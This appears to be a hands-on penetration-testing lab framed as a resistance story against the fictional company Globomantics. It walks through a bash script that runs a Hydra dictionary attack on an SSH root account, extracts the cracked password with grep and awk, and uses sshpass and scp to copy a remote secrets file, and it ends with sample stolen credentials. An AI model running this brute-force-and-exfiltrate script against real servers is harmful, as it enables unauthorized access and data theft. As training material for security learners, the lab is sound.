# Using Hydra to Crack Passwords

## Lab description: In this challenge, you will access the Globomantics network through their SSH service, through a dictionary attack launched using Hydra.

It was a gray, cold winter day when you decided to join the Resistance. The Dark Kittens was the main opposing force against Globomantics' evil intentions, however, nothing matched the power and resources of this huge conglomerate.
Their plan was to deploy artificial intelligence agents to implement a totalitarian regime, in which people's emotions would be forcefully supressed through a drug called "the spice". The humanity was in serious danger.
Until one day, when a whistleblower sent a message to the Dark Kittens, sharing that the keys to the main AI controller were sitting on an SSH server. With those, you, together with the Dark Kittens, could stop Globomantics from putting their evil ideas into practice.

You decide to try hacking into the SSH server and grab the secret keys. 

On a Linux machine, open a terminal. Next, you need to do the following:
1. Create a script called attack.sh.
2. Inside it, add `#!/bin/bash` at the top of the file.
3. After that, add the details of the host, `root` as username, and the path to their secrets file that you got from your informer. The file was supposingly stored in /tmp/sensitive-info.txt file.
4. Next, create the following line, where you sent the path to a file containing a list of the most common passwords to Hydra:
```hydra -l $username -P passwd.txt $host ssh -o result.txt```
5. Then, add the command to fetch the password and store it in a file called result.txt:
```password=$(grep 'login:password' result.txt | awk '{print $3}')```
6. With the purpose of analyzing the secrets file fetched from the Globomantics network, add the following command to copy the file to your machine:
```sshpass -p "${password}" scp "${username}@${host}:${secrets_file_path}" "${local_path}"```
7. Launch the script.

And the result was successful. You managed to extract the following secrets:

```
Password: d683a51d
Secret Key: 493e1aec-a884-11ed-afa1-0242ac120002
```

It was a great victory for humanity! But it was just a battle. The war was far from over...
